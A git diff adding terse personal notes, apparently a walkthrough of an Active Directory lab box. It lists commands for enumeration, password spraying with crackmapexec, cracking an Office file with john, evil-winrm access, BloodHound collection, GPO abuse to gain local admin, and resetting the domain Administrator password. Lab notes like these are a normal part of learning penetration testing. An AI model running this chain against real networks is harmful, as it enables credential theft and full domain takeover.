@@ -1,0 +1,71 @@
+nmap -p- -A -v IP
+enum4linux -A IP
+~/go/bin/kerbrute userenum --dc spray.csl -d spray.csl user.txt
+#found user names with domain name
+
+#Bruteforce smb password
+crackmapexec smb IP -u users -p users --continue-on-success
+
+Login to SMB
+we can use this creds for the below service
+rpc,smb,ldap, winrm
+
+rpcclient -U johana IP
+
+in rpcclient type: enumdomusers
+add the users in the list
+
+smbclient -U johana -L //IP
+
+smbclient -U johana //IP/spray
+
+got smb shell
+
+get file
+
+openfile
+
+#office2john
+office2john filename
+
+john --wordlist rockyou office.hash
+
+crackmapexec smb IP -u users -p 'passwd' --continue-on-success
+s
+evil-winrm -u hackzzdogs -p 'Passwd' -i IP
+
+upload /opt/BloodHound/Collectors/SharpHound.exe
+
+./SharepHound.exe
+
+download BloodHound.zip
+
+#In kali
+neo4j console
+
+start bloodhound
+Upload the zip file
+
+#check the user and domain contorller relationship
+
+#ShareGPO abuce
+
+ .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount hackzzdogs --GPOName "DCPolicy"
+
+
+gpupdate /force
+
+net localgroup administrators
+
+#close the session and reopen the evil-winrm
+net user Administrator vinoth /domain
+
+
+
+
+
+
+
+
+
+
